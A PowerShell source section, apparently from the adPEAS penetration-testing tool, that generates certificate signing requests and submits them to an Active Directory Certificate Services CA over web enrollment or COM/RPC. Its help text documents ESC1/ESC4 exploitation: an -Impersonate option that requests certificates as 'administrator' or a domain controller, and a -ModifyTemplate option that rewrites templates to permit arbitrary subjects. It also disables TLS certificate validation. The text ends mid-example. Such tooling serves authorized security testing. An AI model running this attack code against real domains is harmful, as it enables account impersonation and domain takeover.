#region ===== PKCS#10 CSR GENERATION =====

<#
.SYNOPSIS
    Generates a PKCS#10 Certificate Signing Request using ASN.1 DER encoding.
#>
function New-PKCS10Request {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN,

        [string[]]$AlternativeNames,

        [ValidateSet(1024, 2048, 4096)]
        [int]$KeyLength = 2048
    )

    $FunctionPrefix = "[New-PKCS10Request]"

    # Generate RSA key pair
    Write-Log "$FunctionPrefix Generating $KeyLength-bit RSA key pair"
    $rsa = [System.Security.Cryptography.RSA]::Create($KeyLength)

    try {
        # === 1. Build Subject DN as ASN.1 RDNSequence ===
        $subjectBytes = ConvertTo-ASN1Subject -SubjectDN $SubjectDN

        # === 2. Build SubjectPublicKeyInfo ===
        $rsaParams = $rsa.ExportParameters($false)

        # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
        $modulusInt = New-ASN1Integer -Value ([byte[]](@(0x00) + $rsaParams.Modulus))
        $exponentInt = New-ASN1Integer -Value $rsaParams.Exponent
        $rsaPublicKey = New-ASN1Sequence -Data ([byte[]]($modulusInt + $exponentInt))

        # AlgorithmIdentifier for rsaEncryption (1.2.840.113549.1.1.1)
        $rsaOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.1"
        $algNull = New-ASN1Null
        $algorithmId = New-ASN1Sequence -Data ([byte[]]($rsaOID + $algNull))

        # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
        $pubKeyBitString = New-ASN1BitString -Value $rsaPublicKey
        $subjectPKInfo = New-ASN1Sequence -Data ([byte[]]($algorithmId + $pubKeyBitString))

        # === 3. Build Attributes [0] ===
        $attributesContent = [byte[]]@()

        if ($AlternativeNames -and $AlternativeNames.Count -gt 0) {
            # Build SAN extension via extensionRequest attribute
            $sanExtension = New-SANExtension -AlternativeNames $AlternativeNames
            if ($sanExtension) {
                # Extensions SEQUENCE
                $extensionsSeq = New-ASN1Sequence -Data $sanExtension

                # extensionRequest attribute: OID 1.2.840.113549.1.9.14 + SET { Extensions }
                $extReqOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.9.14"
                $extReqValues = New-ASN1Set -Data $extensionsSeq
                $extReqAttr = New-ASN1Sequence -Data ([byte[]]($extReqOID + $extReqValues))
                $attributesContent = $extReqAttr
            }
        }

        # [0] IMPLICIT constructed context tag
        $attributesTag = [byte]0xA0
        $attributesLenBytes = New-ASN1Length -Length $attributesContent.Length
        $attributes = [byte[]](@($attributesTag) + $attributesLenBytes + $attributesContent)

        # === 4. Build CertificationRequestInfo ===
        $versionInt = New-ASN1Integer -Value 0
        $certReqInfo = New-ASN1Sequence -Data ([byte[]]($versionInt + $subjectBytes + $subjectPKInfo + $attributes))

        # === 5. Sign CertificationRequestInfo ===
        # sha256WithRSAEncryption (1.2.840.113549.1.1.11)
        $sigAlgOID = New-ASN1ObjectIdentifier -OID "1.2.840.113549.1.1.11"
        $sigAlgNull = New-ASN1Null
        $sigAlgorithm = New-ASN1Sequence -Data ([byte[]]($sigAlgOID + $sigAlgNull))

        # Sign with PKCS#1 v1.5
        $signature = $rsa.SignData($certReqInfo, [System.Security.Cryptography.HashAlgorithmName]::SHA256, [System.Security.Cryptography.RSASignaturePadding]::Pkcs1)
        $sigBitString = New-ASN1BitString -Value $signature

        # === 6. Build CertificationRequest ===
        $certRequest = New-ASN1Sequence -Data ([byte[]]($certReqInfo + $sigAlgorithm + $sigBitString))

        # Convert to Base64 (PEM-style, single line for certsrv)
        $csrBase64 = [Convert]::ToBase64String($certRequest)

        Write-Log "$FunctionPrefix CSR generated: $($certRequest.Length) bytes, Subject: $SubjectDN"

        return @{
            CSRBytes  = $certRequest
            CSRBase64 = $csrBase64
            RSAKey    = $rsa
        }
    }
    catch {
        if ($rsa) { $rsa.Dispose() }
        throw
    }
}

<#
.SYNOPSIS
    Converts a Subject DN string to ASN.1 DER encoded RDNSequence.
#>
function ConvertTo-ASN1Subject {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$SubjectDN
    )

    # Well-known attribute type OIDs
    $attrOIDs = @{
        'CN'  = '2.5.4.3'
        'O'   = '2.5.4.10'
        'OU'  = '2.5.4.11'
        'C'   = '2.5.4.6'
        'ST'  = '2.5.4.8'
        'L'   = '2.5.4.7'
        'DC'  = '0.9.2342.19200300.100.1.25'
        'E'   = '1.2.840.113549.1.9.1'
    }

    # Parse DN components (simple parser for CN=...,O=...,DC=... format)
    $rdnSets = [System.Collections.Generic.List[byte[]]]::new()

    # Split on comma but not within escaped commas
    $parts = [regex]::Split($SubjectDN, ',(?=\s*(?:CN|O|OU|C|ST|L|DC|E)\s*=)', [System.Text.RegularExpressions.RegexOptions]::IgnoreCase)

    foreach ($part in $parts) {
        $part = $part.Trim()
        if (-not $part) { continue }

        $eqIdx = $part.IndexOf('=')
        if ($eqIdx -lt 0) { continue }

        $attrType = $part.Substring(0, $eqIdx).Trim().ToUpper()
        $attrValue = $part.Substring($eqIdx + 1).Trim()

        if (-not $attrOIDs.ContainsKey($attrType)) {
            Write-Log "[ConvertTo-ASN1Subject] Unknown attribute type: $attrType, skipping"
            continue
        }

        $oid = New-ASN1ObjectIdentifier -OID $attrOIDs[$attrType]

        # Use PrintableString for most, IA5String for DC and E
        if ($attrType -eq 'DC' -or $attrType -eq 'E') {
            $value = New-ASN1IA5String -Value $attrValue
        }
        elseif ($attrType -eq 'C') {
            # Country must be PrintableString
            $value = New-ASN1PrintableString -Value $attrValue
        }
        else {
            $value = New-ASN1UTF8String -Value $attrValue
        }

        # AttributeTypeAndValue ::= SEQUENCE { type OID, value ANY }
        $atv = New-ASN1Sequence -Data ([byte[]]($oid + $value))

        # RelativeDistinguishedName ::= SET OF AttributeTypeAndValue
        $rdn = New-ASN1Set -Data $atv

        $rdnSets.Add($rdn)
    }

    if ($rdnSets.Count -eq 0) {
        throw "Failed to parse Subject DN: $SubjectDN"
    }

    # Name ::= SEQUENCE OF RelativeDistinguishedName
    $allRDNs = [byte[]]@()
    foreach ($rdn in $rdnSets) {
        $allRDNs = [byte[]]($allRDNs + $rdn)
    }

    return New-ASN1Sequence -Data $allRDNs
}

<#
.SYNOPSIS
    Builds a Subject Alternative Name extension for PKCS#10 CSR attributes.
#>
function New-SANExtension {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string[]]$AlternativeNames
    )

    $generalNames = [byte[]]@()

    foreach ($san in $AlternativeNames) {
        $colonIdx = $san.IndexOf(':')
        if ($colonIdx -lt 0) {
            Write-Warning "[New-SANExtension] Invalid SAN format '$san', expected 'TYPE:value'. Skipping."
            continue
        }

        $sanType = $san.Substring(0, $colonIdx).Trim().ToUpper()
        $sanValue = $san.Substring($colonIdx + 1).Trim()

        switch ($sanType) {
            'UPN' {
                # otherName [0] { OID(1.3.6.1.4.1.311.20.2.3), [0] UTF8String }
                $upnOID = New-ASN1ObjectIdentifier -OID "1.3.6.1.4.1.311.20.2.3"
                $upnUTF8 = New-ASN1UTF8String -Value $sanValue

                # Explicit context tag [0] around UTF8String
                $ctx0Inner = [byte[]](@(0xA0) + (New-ASN1Length -Length $upnUTF8.Length) + $upnUTF8)

                # otherName content = OID + [0] value
                $otherNameContent = [byte[]]($upnOID + $ctx0Inner)

                # GeneralName [0] IMPLICIT (otherName)
                $otherNameTag = [byte]0xA0
                $otherNameLen = New-ASN1Length -Length $otherNameContent.Length
                $generalNames += [byte[]](@($otherNameTag) + $otherNameLen + $otherNameContent)
            }
            'DNS' {
                # dNSName [2] IA5String
                $dnsBytes = [System.Text.Encoding]::ASCII.GetBytes($sanValue)
                $dnsTag = [byte]0x82  # Context [2] IMPLICIT
                $dnsLen = New-ASN1Length -Length $dnsBytes.Length
                $generalNames += [byte[]](@($dnsTag) + $dnsLen + $dnsBytes)
            }
            default {
                Write-Warning "[New-SANExtension] Unsupported SAN type '$sanType'. Supported: UPN, DNS."
            }
        }
    }

    if ($generalNames.Length -eq 0) {
        return $null
    }

    # GeneralNames ::= SEQUENCE OF GeneralName
    $generalNamesSeq = New-ASN1Sequence -Data $generalNames

    # Extension ::= SEQUENCE { extnID OID, critical BOOLEAN (optional), extnValue OCTET STRING }
    $sanOID = New-ASN1ObjectIdentifier -OID "2.5.29.17"
    $sanOctet = New-ASN1OctetString -Value $generalNamesSeq

    return [byte[]](New-ASN1Sequence -Data ([byte[]]($sanOID + $sanOctet)))
}

#endregion

#region ===== COM/RPC CERTIFICATE REQUEST (FALLBACK) =====

<#
.SYNOPSIS
    Embedded C# code for ICertRequest COM interface.
.DESCRIPTION
    Provides COM interop for certificate enrollment when Web Enrollment (/certsrv/) is unavailable.
    Uses the Certificate Enrollment COM API (ICertRequest) via DCOM.
#>

$Script:ICertRequestCode = @'
using System;
using System.Runtime.InteropServices;
using System.Text;

namespace adPEAS
{
    // Certificate Request disposition codes
    public enum CR_DISPOSITION
    {
        CR_DISP_INCOMPLETE = 0,
        CR_DISP_ERROR = 1,
        CR_DISP_DENIED = 2,
        CR_DISP_ISSUED = 3,
        CR_DISP_ISSUED_OUT_OF_BAND = 4,
        CR_DISP_UNDER_SUBMISSION = 5,
        CR_DISP_REVOKED = 6
    }

    // Certificate Request flags
    public static class CR_FLAGS
    {
        public const int CR_IN_BASE64 = 0x1;
        public const int CR_IN_PKCS10 = 0x100;
        public const int CR_OUT_BASE64 = 0x1;
        public const int CR_OUT_CHAIN = 0x100;
    }

    // ICertRequest COM interface
    [ComImport]
    [Guid("014E4840-5523-11CF-8BDB-00AA00C005A4")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    public interface ICertRequest
    {
        [DispId(0x60020000)]
        int Submit(
            [In] int Flags,
            [In, MarshalAs(UnmanagedType.BStr)] string strRequest,
            [In, MarshalAs(UnmanagedType.BStr)] string strAttributes,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020001)]
        int RetrievePending(
            [In] int RequestId,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig);

        [DispId(0x60020002)]
        int GetLastStatus();

        [DispId(0x60020003)]
        int GetRequestId();

        [DispId(0x60020004)]
        int GetDispositionMessage(
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrDispositionMessage);

        [DispId(0x60020005)]
        int GetCACertificate(
            [In] int fExchangeCertificate,
            [In, MarshalAs(UnmanagedType.BStr)] string strConfig,
            [In] int Flags);

        [DispId(0x60020006)]
        int GetCertificate(
            [In] int Flags,
            [Out, MarshalAs(UnmanagedType.BStr)] out string pstrCertificate);
    }

    // Certificate Request helper class
    public class CertificateRequest
    {
        public static CertRequestResult SubmitRequest(
            string caServer,
            string caName,
            string csrBase64,
            string templateName)
        {
            var result = new CertRequestResult
            {
                Success = false,
                Disposition = -1,
                ErrorMessage = null,
                CertificateBase64 = null,
                RequestID = -1
            };

            ICertRequest certRequest = null;

            try
            {
                // Create COM object (local or remote)
                Type certRequestType = Type.GetTypeFromProgID("CertificateAuthority.Request", caServer, false);
                if (certRequestType == null)
                {
                    result.ErrorMessage = "Failed to get COM type CertificateAuthority.Request";
                    return result;
                }

                object certRequestObj = Activator.CreateInstance(certRequestType);
                certRequest = (ICertRequest)certRequestObj;

                // Build CA config string: "CAServer\CAName"
                string caConfig = string.Format("{0}\\{1}", caServer, caName);

                // Build certificate attributes
                string attributes = string.Format("CertificateTemplate:{0}", templateName);

                // Submit request
                int flags = CR_FLAGS.CR_IN_BASE64 | CR_FLAGS.CR_IN_PKCS10;
                int disposition = certRequest.Submit(flags, csrBase64, attributes, caConfig);

                result.Disposition = disposition;
                result.RequestID = certRequest.GetRequestId();

                // Get disposition message
                string dispositionMessage;
                certRequest.GetDispositionMessage(out dispositionMessage);

                if (disposition == (int)CR_DISPOSITION.CR_DISP_ISSUED)
                {
                    // Certificate was issued - retrieve it
                    string certificate;
                    int outFlags = CR_FLAGS.CR_OUT_BASE64 | CR_FLAGS.CR_OUT_CHAIN;
                    certRequest.GetCertificate(outFlags, out certificate);

                    result.Success = true;
                    result.CertificateBase64 = certificate;
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_UNDER_SUBMISSION)
                {
                    result.ErrorMessage = string.Format("Certificate request pending (RequestID: {0}): {1}",
                        result.RequestID, dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_DENIED)
                {
                    result.ErrorMessage = string.Format("Certificate request denied: {0}", dispositionMessage);
                }
                else if (disposition == (int)CR_DISPOSITION.CR_DISP_ERROR)
                {
                    int lastStatus = certRequest.GetLastStatus();
                    result.ErrorMessage = string.Format("Certificate request error (0x{0:X}): {1}",
                        lastStatus, dispositionMessage);
                }
                else
                {
                    result.ErrorMessage = string.Format("Unknown disposition {0}: {1}",
                        disposition, dispositionMessage);
                }
            }
            catch (Exception ex)
            {
                result.ErrorMessage = string.Format("COM exception: {0}", ex.Message);
            }
            finally
            {
                // Release COM object
                if (certRequest != null)
                {
                    Marshal.ReleaseComObject(certRequest);
                }
            }

            return result;
        }
    }

    // Result class
    public class CertRequestResult
    {
        public bool Success;
        public int Disposition;
        public int RequestID;
        public string CertificateBase64;
        public string ErrorMessage;
    }
}
'@

# Load COM interop type (only once)
if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
    try {
        Add-Type -TypeDefinition $Script:ICertRequestCode -Language CSharp -IgnoreWarnings -ErrorAction Stop
        Write-Log "[Request-ADCSCertificate] ICertRequest COM type loaded successfully"
    }
    catch {
        Write-Log "[Request-ADCSCertificate] Failed to load ICertRequest COM type: $_" -Level Warning
    }
}

<#
.SYNOPSIS
    Submits a PKCS#10 CSR via ICertRequest COM/RPC interface.
.DESCRIPTION
    Fallback method when Web Enrollment (/certsrv/) is unavailable.
    Uses DCOM to communicate with the Certificate Authority.
#>
function Submit-COMRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CAName,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
        [string]$TemplateName
    )

    $FunctionPrefix = "[Submit-COMRequest]"

    Write-Log "$FunctionPrefix Submitting CSR via COM/RPC to $CAServer\$CAName"

    $result = @{
        Success      = $false
        RequestID    = $null
        Disposition  = $null
        Certificate  = $null
        ErrorMessage = $null
    }

    try {
        # Check if COM type is loaded
        if (-not ([System.Management.Automation.PSTypeName]'adPEAS.CertificateRequest').Type) {
            $result.ErrorMessage = "ICertRequest COM type not loaded - Add-Type failed during initialization"
            Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
            return $result
        }

        # Call C# COM wrapper
        $comResult = [adPEAS.CertificateRequest]::SubmitRequest(
            $CAServer,
            $CAName,
            $CSRBase64,
            $TemplateName
        )

        $result.Success = $comResult.Success
        $result.RequestID = $comResult.RequestID
        $result.Disposition = $comResult.Disposition
        $result.Certificate = $comResult.CertificateBase64
        $result.ErrorMessage = $comResult.ErrorMessage

        if ($comResult.Success) {
            Write-Log "$FunctionPrefix Certificate issued successfully (RequestID: $($comResult.RequestID))"
        }
        else {
            Write-Log "$FunctionPrefix Request failed: $($comResult.ErrorMessage)" -Level Warning
        }
    }
    catch {
        $result.ErrorMessage = "COM invocation failed: $($_.Exception.Message)"
        Write-Log "$FunctionPrefix $($result.ErrorMessage)" -Level Error
    }

    return $result
}

#endregion

#region ===== CERTSRV HTTP COMMUNICATION =====

<#
.SYNOPSIS
    Submits a PKCS#10 CSR to a certsrv web enrollment endpoint.
#>
function Submit-CertsrvRequest {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [string]$CSRBase64,

        [Parameter(Mandatory)]
        [string]$TemplateName,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Submit-CertsrvRequest]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $submitUrl = "${protocol}://${CAServer}/certsrv/certfnsh.asp"

    Write-Log "$FunctionPrefix Submitting CSR to $submitUrl"

    # Build form data
    $encodedCSR = [System.Uri]::EscapeDataString($CSRBase64)
    $formBody = "Mode=newreq&CertRequest=$encodedCSR&CertAttrib=CertificateTemplate%3A$TemplateName&SaveCert=yes&ThumbPrint="

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    $result = @{
        Success      = $false
        RequestID    = $null
        Status       = $null
        ErrorMessage = $null
        RawResponse  = $null
    }

    try {
        # Enable all TLS versions
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($submitUrl)
        $request.Method = 'POST'
        $request.ContentType = 'application/x-www-form-urlencoded'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true
        $request.MaximumAutomaticRedirections = 5
        $request.CookieContainer = New-Object System.Net.CookieContainer

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($submitUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        # Write request body
        $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes($formBody)
        $request.ContentLength = $bodyBytes.Length

        $requestStream = $null
        try {
            $requestStream = $request.GetRequestStream()
            $requestStream.Write($bodyBytes, 0, $bodyBytes.Length)
        }
        finally {
            if ($requestStream) {
                try { $requestStream.Close() } catch { }
                try { $requestStream.Dispose() } catch { }
            }
        }

        # Execute request
        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                $statusCode = [int]$webEx.Response.StatusCode
                try {
                    $errStream = $webEx.Response.GetResponseStream()
                    $errReader = New-Object System.IO.StreamReader($errStream)
                    $responseContent = $errReader.ReadToEnd()
                    $errReader.Dispose()
                    $errStream.Dispose()
                }
                catch { }
                finally {
                    try { $webEx.Response.Close() } catch { }
                    try { $webEx.Response.Dispose() } catch { }
                }

                if ($statusCode -eq 401) {
                    $result.ErrorMessage = "HTTP 401 Unauthorized. Try using -Credential parameter or check if the CA requires specific authentication."
                    $result.Status = 'AuthError'
                    return $result
                }
                elseif ($statusCode -eq 403) {
                    $result.ErrorMessage = "HTTP 403 Forbidden. Insufficient permissions for certificate enrollment."
                    $result.Status = 'AuthError'
                    return $result
                }
                else {
                    $result.ErrorMessage = "HTTP $statusCode error from CA server"
                    $result.Status = 'Error'
                    return $result
                }
            }
            else {
                $result.ErrorMessage = "Connection failed: $($webEx.Message)"
                $result.Status = 'Error'
                return $result
            }
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        $result.RawResponse = $responseContent

        # Parse response HTML
        if (-not $responseContent) {
            $result.ErrorMessage = "Empty response from CA server"
            $result.Status = 'Error'
            return $result
        }

        # Check for issued certificate (link to download)
        if ($responseContent -match 'certnew\.cer\?ReqID=(\d+)') {
            $result.Success = $true
            $result.RequestID = [int]$Matches[1]
            $result.Status = 'Issued'
            Write-Log "$FunctionPrefix Certificate issued, Request ID: $($result.RequestID)"
        }
        # Check for pending approval
        elseif ($responseContent -match 'Certificate Pending' -or $responseContent -match 'Your certificate request was received') {
            if ($responseContent -match 'Your Request Id is (\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            elseif ($responseContent -match 'ReqID=(\d+)') {
                $result.RequestID = [int]$Matches[1]
            }
            $result.Success = $true
            $result.Status = 'Pending'
            Write-Log "$FunctionPrefix Certificate pending approval, Request ID: $($result.RequestID)"
        }
        # Check for denial
        elseif ($responseContent -match '(?i)denied|(?i)The disposition message is[^<]*?([^<\r\n]+)') {
            $result.Status = 'Denied'
            # Try to extract disposition message
            if ($responseContent -match 'The disposition message is[^"]*"([^"]+)"') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1])"
            }
            elseif ($responseContent -match 'Disposition message:[^\S]*([^\r\n<]+)') {
                $result.ErrorMessage = "Certificate denied: $($Matches[1].Trim())"
            }
            else {
                $result.ErrorMessage = "Certificate request was denied by the CA"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
        else {
            # Unknown response - try to extract any useful info
            $result.Status = 'Error'
            if ($responseContent -match '<title>([^<]+)</title>') {
                $result.ErrorMessage = "Unexpected response: $($Matches[1])"
            }
            else {
                $result.ErrorMessage = "Unexpected response from CA server (no certificate, pending, or denial pattern found)"
            }
            Write-Log "$FunctionPrefix $($result.ErrorMessage)"
        }
    }
    finally {
        # Restore original TLS settings
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }

    return $result
}

<#
.SYNOPSIS
    Retrieves an issued certificate from the certsrv endpoint.
#>
function Get-CertsrvCertificate {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$CAServer,

        [Parameter(Mandatory)]
        [int]$RequestID,

        [PSCredential]$Credential,

        [switch]$UseHTTP,

        [int]$TimeoutSeconds = 30
    )

    $FunctionPrefix = "[Get-CertsrvCertificate]"
    $protocol = if ($UseHTTP) { "http" } else { "https" }
    $retrieveUrl = "${protocol}://${CAServer}/certsrv/certnew.cer?ReqID=${RequestID}&Enc=b64"

    Write-Log "$FunctionPrefix Retrieving certificate from $retrieveUrl"

    # Save and configure TLS settings
    $originalSecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol
    $originalCertCallback = [System.Net.ServicePointManager]::ServerCertificateValidationCallback

    try {
        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls11 -bor [System.Net.SecurityProtocolType]::Tls
        try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor [System.Net.SecurityProtocolType]::Tls13 } catch { }
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

        $request = [System.Net.HttpWebRequest]::Create($retrieveUrl)
        $request.Method = 'GET'
        $request.Timeout = $TimeoutSeconds * 1000
        $request.ReadWriteTimeout = $TimeoutSeconds * 1000
        $request.UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        $request.AllowAutoRedirect = $true

        # Authentication
        if ($Credential) {
            $netCred = $Credential.GetNetworkCredential()
            $credCache = New-Object System.Net.CredentialCache
            $uri = New-Object System.Uri($retrieveUrl)
            $credCache.Add($uri, 'Negotiate', $netCred)
            $credCache.Add($uri, 'NTLM', $netCred)
            $request.Credentials = $credCache
        }
        else {
            $request.UseDefaultCredentials = $true
        }

        $response = $null
        $responseContent = $null
        try {
            $response = $request.GetResponse()
            $responseStream = $response.GetResponseStream()
            $reader = New-Object System.IO.StreamReader($responseStream)
            $responseContent = $reader.ReadToEnd()
            $reader.Dispose()
            $responseStream.Dispose()
        }
        catch [System.Net.WebException] {
            $webEx = $_.Exception
            if ($webEx.Response) {
                try { $webEx.Response.Close() } catch { }
                try { $webEx.Response.Dispose() } catch { }
            }
            Write-Error "$FunctionPrefix Failed to retrieve certificate: $($webEx.Message)"
            return $null
        }
        finally {
            if ($response) {
                try { $response.Close() } catch { }
                try { $response.Dispose() } catch { }
            }
        }

        if (-not $responseContent) {
            Write-Error "$FunctionPrefix Empty response when retrieving certificate"
            return $null
        }

        # Extract Base64 certificate data
        $certBase64 = $null
        if ($responseContent -match '(?s)-----BEGIN CERTIFICATE-----\s*(.+?)\s*-----END CERTIFICATE-----') {
            $certBase64 = $Matches[1] -replace '\s', ''
        }
        else {
            # Response might be raw Base64 without PEM headers
            $cleaned = $responseContent.Trim() -replace '\s', ''
            if ($cleaned -match '^[A-Za-z0-9+/=]+$' -and $cleaned.Length -gt 100) {
                $certBase64 = $cleaned
            }
        }

        if (-not $certBase64) {
            Write-Error "$FunctionPrefix Could not extract certificate data from response"
            return $null
        }

        # Decode to X509Certificate2
        try {
            $certBytes = [Convert]::FromBase64String($certBase64)
            $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(,$certBytes)
            Write-Log "$FunctionPrefix Certificate retrieved: Subject=$($cert.Subject), Thumbprint=$($cert.Thumbprint)"
            return $cert
        }
        catch {
            Write-Error "$FunctionPrefix Failed to parse certificate: $_"
            return $null
        }
    }
    finally {
        [System.Net.ServicePointManager]::SecurityProtocol = $originalSecurityProtocol
        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = $originalCertCallback
    }
}

#endregion

#region ===== MAIN FUNCTION =====

function Request-ADCSCertificate {
<#
.SYNOPSIS
    Requests a certificate from an ADCS Certificate Authority.

.DESCRIPTION
    Generates a PKCS#10 CSR, submits it to a Certificate Authority, and saves the issued certificate as a PFX file.

    Supports multiple submission methods with automatic fallback:
    1. HTTPS Web Enrollment (/certsrv/) - Primary method
    2. HTTP Web Enrollment (/certsrv/) - Fallback if HTTPS unavailable
    3. ICertRequest COM/RPC - Fallback if Web Enrollment unavailable/blocked

    Supports authentication via:
    - Current Windows context (DefaultCredentials) including PTT-injected Kerberos tickets
    - Explicit PSCredential for NTLM/Negotiate authentication

    The function can auto-discover CAs from Active Directory when connected via Connect-adPEAS, or target a specific CA server directly.

.PARAMETER CAServer
    FQDN of the CA server (e.g., "ca01.contoso.com").
    If not specified, auto-discovers from AD using Get-CertificateAuthority.

.PARAMETER TemplateName
    Certificate template name (e.g., "User", "WebServer", "Machine").

.PARAMETER Impersonate
    Convenience parameter for ESC1/ESC4 exploitation. Accepts a username, UPN, or
    FQDN and automatically sets Subject and the appropriate SAN type.

    Accepted formats:
    - "administrator"              - Username only; domain appended, creates UPN SAN
    - "administrator@contoso.com"  - Full UPN; used as-is, creates UPN SAN
    - "srv-dc.contoso.com"         - FQDN; creates DNS SAN (for computer accounts)

    User example: -Impersonate "administrator" is equivalent to -Subject "CN=administrator" -UPN "administrator@contoso.com"
    Computer example: -Impersonate "srv-dc.contoso.com" is equivalent to -Subject "CN=srv-dc" -DNS "srv-dc.contoso.com"

.PARAMETER Subject
    Certificate subject name. The "CN=" prefix is added automatically if omitted.
    Default: current user from session.

    Accepted formats:
    - "Administrator"           - Becomes CN=Administrator
    - "CN=Administrator"        - Used as-is
    - "CN=Admin,O=Contoso"      - Full DN, used as-is

.PARAMETER UPN
    User Principal Name for Subject Alternative Name (e.g., "administrator@contoso.com").
    Added as otherName SAN with Microsoft UPN OID (1.3.6.1.4.1.311.20.2.3).

.PARAMETER DNS
    DNS hostname for Subject Alternative Name (e.g., "dc01.contoso.com").
    Added as dNSName SAN.

.PARAMETER AlternativeNames
    Raw Subject Alternative Names with type prefix. For advanced use cases.
    Supported formats: "UPN:user@domain.com", "DNS:host.domain.com"
    Prefer -UPN and -DNS parameters for simpler usage.

.PARAMETER KeyLength
    RSA key length in bits. Default: 2048. Valid: 1024, 2048, 4096.

.PARAMETER OutputPath
    Path for the PFX file. Default: "<SubjectCN>_<timestamp>.pfx" in current directory.

.PARAMETER Credential
    PSCredential for HTTP authentication against the certsrv endpoint.
    If not specified, uses current Windows context (DefaultCredentials).

.PARAMETER Domain
    Target domain FQDN for CA auto-discovery. Uses session domain if not specified.

.PARAMETER Server
    Specific Domain Controller for LDAP queries during CA auto-discovery.

.PARAMETER ModifyTemplate
    ESC4 exploitation: temporarily modifies the certificate template to allow
    arbitrary subject names (ENROLLEE_SUPPLIES_SUBJECT), adds Client Authentication
    EKU, enables exportable private keys, and removes manager approval.

    The workflow:
    1. Backs up the original template configuration to a JSON file
    2. Modifies the template to be ESC1-exploitable
    3. Requests the certificate with the specified subject/SAN
    4. Restores the original template from backup

    Requires WriteDACL, WriteProperty, or GenericAll permissions on the template.
    The backup file is kept after successful restore for audit purposes.

.PARAMETER UseHTTP
    Use HTTP instead of HTTPS for certsrv requests. Less secure, but works
    when HTTPS is unavailable on the CA server.

.PARAMETER NoPassword
    Export the PFX file without password protection. This allows using the
    certificate directly with Get-CertificateInfo or Connect-adPEAS without
    specifying -CertificatePassword.

.PARAMETER PassThru
    Returns the result as a PSCustomObject to the pipeline instead of only
    displaying console output. Useful for scripting and automation.

.PARAMETER Force
    Overwrite existing PFX file without prompting.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "User"
    Requests a certificate using the "User" template with auto-discovered CA.

.EXAMPLE
    Request-ADCSCertificate -CAServer "ca01.contoso.com" -TemplateName "User" -Credential (Get-Credential)
    Requests a certificate with explicit CA server and credentials.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Impersonate "administrator"
    ESC1 exploitation: requests a certificate as Administrator. Domain suffix is auto-appended from session.

.EXAMPLE
    Request-ADCSCertificate -TemplateName "VulnTemplate" -Subject "Administrator" -UPN "administrator@contoso.com"
